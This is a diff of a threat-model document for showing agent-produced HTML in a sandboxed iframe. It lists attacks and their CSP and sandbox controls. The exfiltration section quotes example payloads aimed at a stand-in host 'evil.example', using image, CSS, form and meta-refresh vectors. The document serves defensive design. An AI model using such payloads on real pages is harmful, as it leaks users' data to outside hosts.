@@ -44,6 +44,7 @@ The machine's general `X-Frame-Options: DENY` is left off these responses only. 
 *Attack.* `<script>`, `onerror=`, `javascript:` URLs, or SVG script try to read `document.cookie`, `localStorage` or IndexedDB, or to reach `parent.document`.
 
 *Controls.*
+
 - The CSP `sandbox` directive has no `allow-scripts`, so no script runs at all: inline, external, event handler or `javascript:` URL. The header applies in the frame and in a new tab alike, because it doesn't depend on Commander's `sandbox` attribute.
 - `sandbox` without `allow-same-origin` gives the page an opaque origin. Even if script did run, it couldn't read the machine origin's storage, or Commander's storage when Commander is served from the machine. Commander stores no cookies by design.
 - Commander adds a second, independent `sandbox=""` on the iframe. A misconfigured header still leaves the frame scriptless and opaque.
@@ -56,6 +57,7 @@ The machine's general `X-Frame-Options: DENY` is left off these responses only. 
 *Attack.* `<img src="https://evil.example/?k=…">`, CSS `background:url(https://evil…)`, `<link rel=prefetch>`, `<form action=https://evil…>`, `<meta http-equiv=refresh content="0;url=https://evil…">`, a font from a third-party host, or `<video src=https://evil…>`.
 
 *Controls.*
+
 - `default-src 'none'` covers everything that isn't named. `connect-src` falls back to `'none'`. Images, media, styles and fonts may only come from the machine origin (`'self'`) or `data:`. `form-action 'none'` blocks form posts, and the sandbox blocks form submission and automatic features as well.
 - The page holds no secret worth exfiltrating. It's the agent's own content, and its opaque origin can't reach a DPoP key or credential.
 - The ticket in the URL is a short-lived read capability. It is scoped to one session's artifacts on one machine and bound to one frame-ancestor origin. `Referrer-Policy: no-referrer` stops it from leaving in a `Referer` header, and `Cache-Control: no-store` keeps it out of shared caches.
@@ -69,6 +71,7 @@ The machine's general `X-Frame-Options: DENY` is left off these responses only. 
 *Attack.* The page navigates `window.top` to a phishing copy of Commander, opens pop-ups, or draws a fake "Re-pair this machine" dialog over Commander. In the other direction, a third-party site frames a ticket URL, or frames Commander, to trick the operator into a click.
 
 *Controls.*
+
 - The sandbox omits `allow-top-navigation`, `allow-top-navigation-by-user-activation`, `allow-popups` and `allow-modals`. The page can't move `top`, open windows, or raise alerts.
 - The frame is confined to its box in the thread. Its size is fixed by Commander's layout, `overflow` is clipped, and the page can't paint outside the frame.
 - `frame-ancestors <minting origin>` means only the Commander origin that minted the ticket can embed the page. Any other site gets a blocked frame.
